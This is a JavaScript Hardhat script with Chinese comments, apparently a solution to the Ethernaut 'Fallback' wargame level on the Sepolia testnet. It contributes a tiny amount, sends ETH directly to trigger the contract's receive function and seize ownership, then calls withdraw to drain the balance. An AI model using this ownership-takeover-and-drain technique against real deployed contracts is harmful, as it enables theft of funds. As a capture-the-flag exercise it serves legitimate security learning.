const {ethers} = require('hardhat');
require('dotenv').config();
//链上交互的方式
// 获得这个合约的所有权
// 把他的余额减到0
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;
//provider
const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
//合约地址
FALLBACK_ADDRESS = '0xcF8D61A40EA81Ce07F2f6470Fe4e8b4EA9F88205';
//钱包
const wallet = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);
//合约abi
const Fallback_abi = [
    " function contribute() public payable",
    "function getContribution() public view returns (uint)",
    "function withdraw() public ",
    "function owner() public view returns (address)",
    "function balance() public view returns (uint)",
];
//创建合约实例用来交互,可读合约声明方式？
const fallback = new ethers.Contract(FALLBACK_ADDRESS, Fallback_abi, provider);

const main = async () => {
    //输出钱包地址
    console.log('第二个钱包地址为：', wallet.address);
    //第二个钱包调用contribute函数发送交易
    const tx1 = await fallback.connect(wallet).contribute({value:ethers.utils.parseEther('0.000001')});
    await tx1.wait();
    const wallet2_contribution = await fallback.connect(wallet).getContribution();
    console.log('第二个钱包的贡献金额：', ethers.utils.formatUnits(wallet2_contribution, 'ether'));
    //通过直接调用合约receive函数，来发送eth，修改owner = msg.sender;
    //构建第二个tx2，基础发送eth???
    const tx2 = {
        to: FALLBACK_ADDRESS,
        value: ethers.utils.parseEther('0.000001'),
    };
    //利用wallet类的sendTransaction来发送交易
    const receipt = await wallet.sendTransaction(tx2);
    await receipt.wait();
   // 查看合约拥有者状态
    const owner = await fallback.owner();
    console.log('合约拥有者：', owner);
    //查看合约余额
    const contract_balance = await ethers.provider.getBalance(FALLBACK_ADDRESS)  ;
    console.log('合约余额：', ethers.utils.formatEther(contract_balance));
    //跑路
    const tx3 = await fallback.connect(wallet).withdraw();
    await tx3.wait();

}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    })